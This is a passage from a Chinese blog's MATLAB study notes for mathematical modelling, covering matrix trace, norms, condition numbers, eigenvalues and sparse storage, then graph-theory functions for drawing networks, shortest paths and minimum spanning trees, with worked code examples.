class="hljs-number">12</span>]<br><br>a =<br><br>       <span class="hljs-number">1</span>              <span class="hljs-number">2</span>              <span class="hljs-number">3</span>              <span class="hljs-number">4</span>       <br>       <span class="hljs-number">5</span>              <span class="hljs-number">6</span>              <span class="hljs-number">7</span>              <span class="hljs-number">8</span>       <br>       <span class="hljs-number">9</span>             <span class="hljs-number">10</span>             <span class="hljs-number">11</span>             <span class="hljs-number">12</span>       <br><br>&gt;&gt; rank(a)<br><br><span class="hljs-built_in">ans</span> =<br><br>       <span class="hljs-number">2</span>    <br></code></pre></div></td></tr></table></figure><h4 id="3-3-3-矩阵的迹"><a href="#3-3-3-矩阵的迹" class="headerlink" title="3.3.3 矩阵的迹"></a>3.3.3 矩阵的迹</h4><p>矩阵的迹等于矩阵的对角线元素之和，也等于矩阵的特征值之和。<br><code>trace(a)</code>：求矩阵 a 的迹。</p><p>示例：</p><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">&gt;&gt; a=[<span class="hljs-number">1</span>:<span class="hljs-number">4</span>;<span class="hljs-number">5</span>:<span class="hljs-number">8</span>;<span class="hljs-number">9</span>:<span class="hljs-number">12</span>;<span class="hljs-number">13</span>:<span class="hljs-number">16</span>]<br><br>a =<br><br>       <span class="hljs-number">1</span>              <span class="hljs-number">2</span>              <span class="hljs-number">3</span>              <span class="hljs-number">4</span>       <br>       <span class="hljs-number">5</span>              <span class="hljs-number">6</span>              <span class="hljs-number">7</span>              <span class="hljs-number">8</span>       <br>       <span class="hljs-number">9</span>             <span class="hljs-number">10</span>             <span class="hljs-number">11</span>             <span class="hljs-number">12</span>       <br>      <span class="hljs-number">13</span>             <span class="hljs-number">14</span>             <span class="hljs-number">15</span>             <span class="hljs-number">16</span>       <br><br>&gt;&gt; trace(a)<br><br><span class="hljs-built_in">ans</span> =<br><br>      <span class="hljs-number">34</span>  <br></code></pre></div></td></tr></table></figure><h4 id="3-3-4-向量和矩阵的范数"><a href="#3-3-4-向量和矩阵的范数" class="headerlink" title="3.3.4 向量和矩阵的范数"></a>3.3.4 向量和矩阵的范数</h4><p>矩阵或向量的范数用来度量矩阵或向量在某种意义下的长度。</p><h5 id="3-3-4-1-向量的-3-种常用范数"><a href="#3-3-4-1-向量的-3-种常用范数" class="headerlink" title="3.3.4.1 向量的 3 种常用范数"></a>3.3.4.1 向量的 3 种常用范数</h5><blockquote><ol><li>向量1-范数：向量元素的绝对值之和。</li></ol></blockquote><p><code>norm(v,1)</code>：计算向量 v 的1-范数。</p><blockquote><ol start="2"><li>向量2-范数：向量元素平方和的平方根。</li></ol></blockquote><p><code>norm(v)或norm(v,2)</code>：计算向量 v 的 2-范数。</p><blockquote><ol start="3"><li>向量∞-范数：所有向量元素绝对值中的最大值。</li></ol></blockquote><p><code>norm(v,inf)</code>：计算向量 v 的 ∞-范数。</p><h5 id="3-3-4-2-矩阵的范数"><a href="#3-3-4-2-矩阵的范数" class="headerlink" title="3.3.4.2 矩阵的范数"></a>3.3.4.2 矩阵的范数</h5><blockquote><ol><li>矩阵 a 的 1-范数：矩阵列元素绝对值之和的最大值。</li></ol></blockquote><blockquote><ol start="2"><li>矩阵 a 的 2-范数：a’a 矩阵的最大特征值的平方根。</li></ol></blockquote><blockquote><ol start="3"><li>矩阵 a 的 ∞-范数：所有矩阵行元素绝对值之和的最大值。</li></ol></blockquote><p><strong>矩阵求3种范数的函数与向量的函数完全相同。</strong></p><h4 id="3-3-5-矩阵的条件数"><a href="#3-3-5-矩阵的条件数" class="headerlink" title="3.3.5 矩阵的条件数"></a>3.3.5 矩阵的条件数</h4><ul><li><p>矩阵 a 的条件数等于 a 的范数与 a 的逆矩阵的范数的乘积。</p></li><li><p>条件数是大于1的，越接近于1，矩阵的性能越好，反之，矩阵的性能越差。</p></li></ul><blockquote><ol><li><code>cond(a,1)</code>：计算 a 的 1-范数下的条件数。</li></ol></blockquote><blockquote><ol start="2"><li><code>cond(a)或cond(a,2)</code>：计算 a 的 2-范数下的条件数。</li></ol></blockquote><blockquote><ol start="3"><li><code>cond(a,inf)</code>：计算 a 的 ∞-范数下的条件数。</li></ol></blockquote><h3 id="3-4-矩阵的特征值与特征向量"><a href="#3-4-矩阵的特征值与特征向量" class="headerlink" title="3.4 矩阵的特征值与特征向量"></a>3.4 矩阵的特征值与特征向量</h3><p><code>E=eig(a)</code>：求矩阵 a 的全部特征值，构成向量 E 。</p><p><code>[X,D]=eig(a)</code>：求矩阵 a 的全部特征值，构成对角阵 D ，并产生矩阵 X，X 各列是相应的特征向量。</p><p>Matlab 提供了一个 <code>eigshow函数</code>，可以演示单位圆上的向量 X 和 Ax 之间的关系。</p><h3 id="3-5-稀疏矩阵"><a href="#3-5-稀疏矩阵" class="headerlink" title="3.5 稀疏矩阵"></a>3.5 稀疏矩阵</h3><p>矩阵有两种存储方式：完全存储方式、稀疏存储方式。<br>稀疏存储方式只存储矩阵的非零元素的值及其位置，即行号和列号。但采用稀疏存储方式时，矩阵元素的存储顺序并没有改变，也是按列的顺序进行存储。<br>示例：</p><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">&gt;&gt; a=[<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>;<span class="hljs-number">0</span>,<span class="hljs-number">5</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>;<span class="hljs-number">2</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">7</span>]<br><br>a =<br><br>     <span class="hljs-number">1</span>     <span class="hljs-number">0</span>     <span class="hljs-number">0</span>     <span class="hljs-number">0</span><br>     <span class="hljs-number">0</span>     <span class="hljs-number">5</span>     <span class="hljs-number">0</span>     <span class="hljs-number">0</span><br>     <span class="hljs-number">2</span>     <span class="hljs-number">0</span>     <span class="hljs-number">0</span>     <span class="hljs-number">7</span><br></code></pre></div></td></tr></table></figure><p>a 矩阵的稀疏存储方式为：</p><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">(<span class="hljs-number">1</span>,<span class="hljs-number">1</span>) , <span class="hljs-number">1</span><br>(<span class="hljs-number">3</span>,<span class="hljs-number">1</span>) , <span class="hljs-number">2</span><br>(<span class="hljs-number">2</span>,<span class="hljs-number">2</span>) , <span class="hljs-number">5</span><br>(<span class="hljs-number">3</span>,<span class="hljs-number">4</span>) , <span class="hljs-number">7</span><br></code></pre></div></td></tr></table></figure><h4 id="3-5-1-完全存储方式与稀疏存储方式之间的转化"><a href="#3-5-1-完全存储方式与稀疏存储方式之间的转化" class="headerlink" title="3.5.1 完全存储方式与稀疏存储方式之间的转化"></a>3.5.1 完全存储方式与稀疏存储方式之间的转化</h4><p><code>A=sparse(s)</code>：将矩阵 S 转化为稀疏存储方式的矩阵 A 。<br><code>S=full(a)</code>：将矩阵 a 转化为完全存储方式的矩阵 S 。</p><h4 id="3-5-2-直接建立稀疏存储矩阵"><a href="#3-5-2-直接建立稀疏存储矩阵" class="headerlink" title="3.5.2 直接建立稀疏存储矩阵"></a>3.5.2 直接建立稀疏存储矩阵</h4><p><code>sparse(m,n)</code>：生成一个 m * n 的所有元素都是零的稀疏矩阵。<br><code>sparse(u,v,s)</code>：其中 u、v、s 是 3 个等长的向量。s 是要建立的稀疏存储矩阵的非零元素，u(i)、v(i)分别是 s(i) 的行和列下标。</p><p>使用 <code>spconvert函数</code> 直接建立稀疏存储矩阵，其调用格式为：B = spconvert(A)<br>A 为一个 m * 3 或者 m * 4 的矩阵，其每行表示一个非零元素，m 是非零元素的个数。</p><ul><li><p><code>A()</code>：第 i 个非零元素所在的行。</p></li><li><p><code>A()</code>：第 i 个非零元素所在的列。</p></li><li><p><code>A()</code>：第 i 个非零元素值的实部。</p></li><li><p><code>A()</code>：第 i 个非零元素值的虚部。</p></li></ul><p>若矩阵的全部元素都是实数，则无须第 4 列。</p><h4 id="3-5-3-带状稀疏矩阵的稀疏存储"><a href="#3-5-3-带状稀疏矩阵的稀疏存储" class="headerlink" title="3.5.3 带状稀疏矩阵的稀疏存储"></a>3.5.3 带状稀疏矩阵的稀疏存储</h4><p>稀疏矩阵有两种基本类型：无规则结构的稀疏矩阵与有规则结构的稀疏矩阵。<br>带状稀疏矩阵是指所有非零元素集中在对角线上的矩阵。</p><p><code>[B,d]=spdiags(A)</code>：从带状稀疏矩阵 A 中提取全部非零对角线元素赋给矩阵 B 及其这些非零对角线的位置向量 d 。<br><code>A=spdiags(B,d,m,n)</code>：产生带状稀疏矩阵的稀疏存储矩阵 A ，其中m、n 为原带状稀疏矩阵的行数与列数，矩阵 B 的第 i 列即为原带状稀疏矩阵的第 i 条非零对角线，向量 d 为原带状稀疏矩阵所有非零对角线的位置。</p><h4 id="3-5-4-单位矩阵的稀疏存储"><a href="#3-5-4-单位矩阵的稀疏存储" class="headerlink" title="3.5.4 单位矩阵的稀疏存储"></a>3.5.4 单位矩阵的稀疏存储</h4><p><code>speye(m,n)</code>：返回一个 m * n 的稀疏存储单位矩阵。<br>示例：</p><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">&gt;&gt; speye(<span class="hljs-number">3</span>)<br><br><span class="hljs-built_in">ans</span> =<br><br>   (<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)        <span class="hljs-number">1</span><br>   (<span class="hljs-number">2</span>,<span class="hljs-number">2</span>)        <span class="hljs-number">1</span><br>   (<span class="hljs-number">3</span>,<span class="hljs-number">3</span>)        <span class="hljs-number">1</span><br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>数学建模</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>数学建模-Matlab学习笔记（十三）图论</title>
    <link href="/2021/06/18/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1-Matlab%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E5%8D%81%E4%B8%89%EF%BC%89%E5%9B%BE%E8%AE%BA/"/>
    <url>/2021/06/18/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1-Matlab%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E5%8D%81%E4%B8%89%EF%BC%89%E5%9B%BE%E8%AE%BA/</url>
    
    <content type="html"><![CDATA[<p>MATLAB（矩阵实验室）是第四代高层次的编程语言和交互式环境数值计算，可视化和编程。由美国MathWorks公司开发的一种编程语言。用于算法开发、数据可视化、数据分析以及数值计算的高级技术计算语言和交互式环境，主要包括MATLAB和Simulink两大部分。拥有众多的内置命令和数学函数，可以帮助您在数学计算，绘图和执行数值计算方法。 </p><h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><h2 id="一-画网络图"><a href="#一-画网络图" class="headerlink" title="一.画网络图"></a>一.画网络图</h2><p>Matlab有一个自带的<code>biography</code>类型，可以直接画图论关系图。在Matlab中一般用稀疏矩阵（<code>sparse函数</code>）。</p><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">R=[<span class="hljs-number">1</span> <span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">4</span> <span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">3</span> <span class="hljs-number">5</span> <span class="hljs-number">7</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span> <span class="hljs-number">5</span> <span class="hljs-number">6</span> <span class="hljs-number">7</span> <span class="hljs-number">8</span>]; <span class="hljs-comment">% 起始节点编号</span><br>C=[<span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">3</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span> <span class="hljs-number">5</span> <span class="hljs-number">5</span> <span class="hljs-number">6</span> <span class="hljs-number">6</span> <span class="hljs-number">6</span> <span class="hljs-number">7</span> <span class="hljs-number">7</span> <span class="hljs-number">8</span> <span class="hljs-number">8</span> <span class="hljs-number">8</span> <span class="hljs-number">7</span>]; <span class="hljs-comment">% 起始节点可连接的节点编号</span><br>W=[<span class="hljs-number">2</span> <span class="hljs-number">8</span> <span class="hljs-number">6</span> <span class="hljs-number">7</span> <span class="hljs-number">1</span> <span class="hljs-number">1</span> <span class="hljs-number">5</span> <span class="hljs-number">1</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span> <span class="hljs-number">2</span> <span class="hljs-number">9</span> <span class="hljs-number">8</span> <span class="hljs-number">6</span> <span class="hljs-number">3</span> <span class="hljs-number">0</span>]; <span class="hljs-comment">% 权重</span><br>G=sparse(R,C,W);<span class="hljs-comment">%产生稀疏矩阵</span><br></code></pre></div></td></tr></table></figure><p>其中，R和C分别表示节点，W表示对应两节点之间的权值。（R和C分别表示节点坐标x,y的标量，W表示对应两节点之间的边权值。）<code>注意：</code>sparse函数会生成一个<code>m*n</code>对double型矩阵，m是R中最大的数字，n是C中最大的数字。如果其值不相同，那么生成的矩阵将不是方阵，<code>而所有的图论算法操作的矩阵都是方阵</code>，所以在R和C和W的最后添加了8 7 0三个数字，来保证生成方阵。<code>如果R C中出现重复边，会将其权值相加。</code>所以最后在W里写0，不影响边权值。</p><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">view(biograph(G,[],<span class="hljs-string">&#x27;ShowW&#x27;</span>,<span class="hljs-string">&#x27;ON&#x27;</span>)); <span class="hljs-comment">%生成图</span><br></code></pre></div></td></tr></table></figure><p>其中<code>biography</code>为生成一个biography object ，<code>[]中为节点名称 默认为Node1 </code>，<code>‘ShowW&#39; ‘ON&#39; 表示显示权值</code> 类似的有<code>&#39;ShowArrows&#39; ‘ON’为显示箭头</code>。</p><h2 id="二-图涂色"><a href="#二-图涂色" class="headerlink" title="二.图涂色"></a>二.图涂色</h2><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">clc,clear;<br>a=<span class="hljs-built_in">zeros</span>(<span class="hljs-number">7</span>);<br>a(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>)=<span class="hljs-number">4</span>;a(<span class="hljs-number">1</span>,<span class="hljs-number">3</span>)=<span class="hljs-number">2</span>;<br>a(<span class="hljs-number">2</span>,<span class="hljs-number">3</span>)=<span class="hljs-number">3</span>;a(<span class="hljs-number">2</span>,<span class="hljs-number">4</span>)=<span class="hljs-number">2</span>;a(<span class="hljs-number">2</span>,<span class="hljs-number">5</span>)=<span class="hljs-number">6</span>;<br>a(<span class="hljs-number">3</span>,<span class="hljs-number">4</span>)=<span class="hljs-number">5</span>;a(<span class="hljs-number">3</span>,<span class="hljs-number">6</span>)=<span class="hljs-number">4</span>;<br>a(<span class="hljs-number">4</span>,<span class="hljs-number">5</span>)=<span class="hljs-number">2</span>;a(<span class="hljs-number">4</span>,<span class="hljs-number">6</span>)=<span class="hljs-number">7</span>;<br>a(<span class="hljs-number">5</span>,<span class="hljs-number">6</span>)=<span class="hljs-number">4</span>;a(<span class="hljs-number">5</span>,<span class="hljs-number">7</span>)=<span class="hljs-number">8</span>;<br>a(<span class="hljs-number">6</span>,<span class="hljs-number">7</span>)=<span class="hljs-number">3</span>;<br>b=sparse(a);<span class="hljs-comment">%构造稀疏矩阵</span><br><span class="hljs-comment">%有向图对应Directed为true，求最短路的方法是bellman-ford法</span><br>[x,y,z]=graphshortestpath(b,<span class="hljs-number">1</span>,<span class="hljs-number">7</span>,<span class="hljs-string">&#x27;Directed&#x27;</span>,<span class="hljs-built_in">true</span>,<span class="hljs-string">&#x27;Method&#x27;</span>,<span class="hljs-string">&#x27;Bellman-Ford&#x27;</span>);<br>h=view(biograph(b,[]))<span class="hljs-comment">%画图</span><br><br>h=view(biograph(b,[]))<br><br>set(h.Nodes(y),<span class="hljs-string">&#x27;Color&#x27;</span>,[<span class="hljs-number">1</span> <span class="hljs-number">0.4</span> <span class="hljs-number">0.4</span>])<br>edges = getedgesbynodeid(h,get(h.Nodes(y),<span class="hljs-string">&#x27;ID&#x27;</span>));<br>set(edges,<span class="hljs-string">&#x27;LineColor&#x27;</span>,[<span class="hljs-number">1</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span>])<br>set(edges,<span class="hljs-string">&#x27;LineWidth&#x27;</span>,<span class="hljs-number">1.5</span>)<br><br></code></pre></div></td></tr></table></figure><p>效果如图：</p><p><img src="https://img-blog.csdnimg.cn/20210715153814278.png"></p><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">clc,clear<br>a=<span class="hljs-built_in">zeros</span>(<span class="hljs-number">7</span>);<br>a(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>)=<span class="hljs-number">4</span>;a(<span class="hljs-number">1</span>,<span class="hljs-number">3</span>)=<span class="hljs-number">2</span>;<br>a(<span class="hljs-number">2</span>,<span class="hljs-number">3</span>)=<span class="hljs-number">3</span>;a(<span class="hljs-number">2</span>,<span class="hljs-number">4</span>)=<span class="hljs-number">2</span>;a(<span class="hljs-number">2</span>,<span class="hljs-number">5</span>)=<span class="hljs-number">6</span>;<br>a(<span class="hljs-number">3</span>,<span class="hljs-number">4</span>)=<span class="hljs-number">5</span>;a(<span class="hljs-number">3</span>,<span class="hljs-number">6</span>)=<span class="hljs-number">4</span>;<br>a(<span class="hljs-number">4</span>,<span class="hljs-number">5</span>)=<span class="hljs-number">2</span>;a(<span class="hljs-number">4</span>,<span class="hljs-number">6</span>)=<span class="hljs-number">7</span>;<br>a(<span class="hljs-number">5</span>,<span class="hljs-number">6</span>)=<span class="hljs-number">4</span>;a(<span class="hljs-number">5</span>,<span class="hljs-number">7</span>)=<span class="hljs-number">8</span>;<br>a(<span class="hljs-number">6</span>,<span class="hljs-number">7</span>)=<span class="hljs-number">3</span>;<br><br><span class="hljs-comment">% %构建稀疏矩阵</span><br>b=sparse(a);<br><span class="hljs-comment">% 画网络图</span><br>h=view(biograph(b,[],<span class="hljs-string">&#x27;showArrows&#x27;</span>,<span class="hljs-string">&#x27;on&#x27;</span>,<span class="hljs-string">&#x27;ShowWeights&#x27;</span>,<span class="hljs-string">&#x27;on&#x27;</span>))<br><br>[dist,path,pred] = graphshortestpath(b,<span class="hljs-number">1</span>,<span class="hljs-number">7</span>)<br> <span class="hljs-comment">% Mark the nodes and edges of the shortest path</span><br>set(h.Nodes(path),<span class="hljs-string">&#x27;Color&#x27;</span>,[<span class="hljs-number">1</span> <span class="hljs-number">0.4</span> <span class="hljs-number">0.4</span>])<br>edges = getedgesbynodeid(h,get(h.Nodes(path),<span class="hljs-string">&#x27;ID&#x27;</span>));<br>set(edges,<span class="hljs-string">&#x27;LineColor&#x27;</span>,[<span class="hljs-number">1</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span>])<br>set(edges,<span class="hljs-string">&#x27;LineWidth&#x27;</span>,<span class="hljs-number">1.5</span>)<br><br></code></pre></div></td></tr></table></figure><p>效果如图：</p><p><img src="https://img-blog.csdnimg.cn/20210715154205448.png"></p><h2 id="二-图论工具箱"><a href="#二-图论工具箱" class="headerlink" title="二.图论工具箱"></a>二.图论工具箱</h2><h2 id="1-最短路"><a href="#1-最短路" class="headerlink" title="1.最短路"></a>1.最短路</h2><h3 id="1-1-指定点对"><a href="#1-1-指定点对" class="headerlink" title="1.1 指定点对"></a>1.1 指定点对</h3><blockquote><ol><li>功能</li></ol></blockquote><p>求指定的一对顶点间的最短距离和最短路径。</p><blockquote><ol start="2"><li>使用方法</li></ol></blockquote><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">[dist path]=graphshortestpath(G,v1,v2)<br></code></pre></div></td></tr></table></figure><p>其中v1，v2为两点。返回的dist为路径长，path为路径。</p><ul><li>使用一：</li></ul><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">a=<span class="hljs-built_in">zeros</span>(<span class="hljs-number">6</span>);<br>a(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>)=<span class="hljs-number">50</span>;a(<span class="hljs-number">1</span>,<span class="hljs-number">4</span>)=<span class="hljs-number">40</span>;a(<span class="hljs-number">1</span>,<span class="hljs-number">5</span>)=<span class="hljs-number">25</span>;a(<span class="hljs-number">1</span>,<span class="hljs-number">6</span>)=<span class="hljs-number">10</span>;               <br>a(<span class="hljs-number">2</span>,<span class="hljs-number">3</span>)=<span class="hljs-number">15</span>;a(<span class="hljs-number">2</span>,<span class="hljs-number">4</span>)=<span class="hljs-number">20</span>;a(<span class="hljs-number">2</span>,<span class="hljs-number">6</span>)=<span class="hljs-number">25</span>;<br>a(<span class="hljs-number">3</span>,<span class="hljs-number">4</span>)=<span class="hljs-number">10</span>;a(<span class="hljs-number">3</span>,<span class="hljs-number">5</span>)=<span class="hljs-number">20</span>;<br>a(<span class="hljs-number">4</span>,<span class="hljs-number">5</span>)=<span class="hljs-number">10</span>;a(<span class="hljs-number">4</span>,<span class="hljs-number">6</span>)=<span class="hljs-number">25</span>;<br>a(<span class="hljs-number">5</span>,<span class="hljs-number">6</span>)=<span class="hljs-number">55</span>;<br>a=a+a&#x27;;<br><br>h=sparse(a);<br><br>[t,tt]=graphshortestpath(h,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>)<br></code></pre></div></td></tr></table></figure><ul><li>使用二：</li></ul><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">c=[<span class="hljs-number">1</span> <span class="hljs-number">1</span> <span class="hljs-number">1</span> <span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">2</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span> <span class="hljs-number">4</span> <span class="hljs-number">5</span> <span class="hljs-number">1</span> <span class="hljs-number">6</span>]<br>v=[<span class="hljs-number">2</span> <span class="hljs-number">4</span> <span class="hljs-number">5</span> <span class="hljs-number">6</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span> <span class="hljs-number">6</span> <span class="hljs-number">4</span> <span class="hljs-number">5</span> <span class="hljs-number">5</span> <span class="hljs-number">6</span> <span class="hljs-number">6</span> <span class="hljs-number">1</span> <span class="hljs-number">6</span>]<br>w=[<span class="hljs-number">50</span> <span class="hljs-number">40</span> <span class="hljs-number">25</span> <span class="hljs-number">10</span> <span class="hljs-number">15</span> <span class="hljs-number">20</span> <span class="hljs-number">25</span> <span class="hljs-number">10</span> <span class="hljs-number">20</span> <span class="hljs-number">10</span> <span class="hljs-number">25</span> <span class="hljs-number">55</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span>]<br>h=sparse(c,v,w)<br>[t,tt]=graphshortestpath(h,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>)<br></code></pre></div></td></tr></table></figure><h3 id="1-2-任意点对"><a href="#1-2-任意点对" class="headerlink" title="1.2 任意点对"></a>1.2 任意点对</h3><blockquote><ol><li>功能</li></ol></blockquote><p>求图中所有顶点对之间的最短路径。</p><blockquote><ol start="2"><li>使用格式</li></ol></blockquote><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">[dist]=graphallshortestpaths(G)<br>[dist]=graphallshortestpaths(G,...’Directed’,DirectedValue,...)<br>[dist]=graphallshortestpaths(G,...’Weights’,WeightsValue,...)<br></code></pre></div></td></tr></table></figure><p>如果想要生成无向图，需要这样操作：<code>UG=tril(G+G&#39;)</code>;就是把G和自己的转置G’加起来再求等价变换得到的下三角矩阵。</p><p>DirectedValue属性：True（有向图，默认），false（无向图）。</p><p>WeightsValue属性：Weightvalue属性一般不用指定，函数graphallshortestpath函数默认从稀疏矩阵G中获取。</p><p>Dist输出参数：输出[dist]是一个N * N的矩阵，每一个元素代表两点之间最短距离，对角线上的元素总为零，不在对角线上的零表示起点和终点的距离为零，inf值表示没有路径。</p><h2 id="2-最小生成树"><a href="#2-最小生成树" class="headerlink" title="2.最小生成树"></a>2.最小生成树</h2><blockquote><ol><li>功能 </li></ol></blockquote><p>在图中找最小生成树</p><blockquote><ol start="2"><li>使用格式</li></ol></blockquote><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">[Tree,pred]=graphminspantree(G)<br>[Tree,pred]=graphminspantree(G,R)<br>[Tree,pred]=graphminspantree(...,’Method’,MethofValue,...)<br>[Tree,pred]=graphminspantree(...,’Weights’,WeightsValue,...)<br></code></pre></div></td></tr></table></figure><ul><li>参数：Tree（一个代表生成树的稀疏矩阵）；Pred（包含最小生成的祖先节点的向量）；G（稀疏矩阵）；R（根节点，取值为1到节点数目）；Method（可以选择‘Kruskal’,’Prim’等算法）。</li></ul><p>使用：</p><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">w=[<span class="hljs-number">41</span> <span class="hljs-number">99</span> <span class="hljs-number">51</span> <span class="hljs-number">32</span> <span class="hljs-number">15</span> <span class="hljs-number">45</span> <span class="hljs-number">38</span> <span class="hljs-number">32</span> <span class="hljs-number">36</span> <span class="hljs-number">29</span> <span class="hljs-number">21</span>]<br>dg=sparse([<span class="hljs-number">6</span> <span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span> <span class="hljs-number">4</span> <span class="hljs-number">5</span> <span class="hljs-number">5</span> <span class="hljs-number">6</span> <span class="hljs-number">1</span>],[<span class="hljs-number">2</span> <span class="hljs-number">6</span> <span class="hljs-number">3</span> <span class="hljs-number">5</span> <span class="hljs-number">4</span> <span class="hljs-number">1</span> <span class="hljs-number">6</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span> <span class="hljs-number">3</span> <span class="hljs-number">5</span>],w)<br>ug=<span class="hljs-built_in">tril</span>(dg+dg&#x27;)<br>[tree,pred]=graphminspantree(ug)<br></code></pre></div></td></tr></table></figure><h2 id="3-最大流"><a href="#3-最大流" class="headerlink" title="3.最大流"></a>3.最大流</h2><blockquote><ol><li>功能</li></ol></blockquote><p>计算有向图的最大流</p><blockquote><ol start="2"><li>使用格式</li></ol></blockquote><figure class="highlight matlab"><table><tr><td 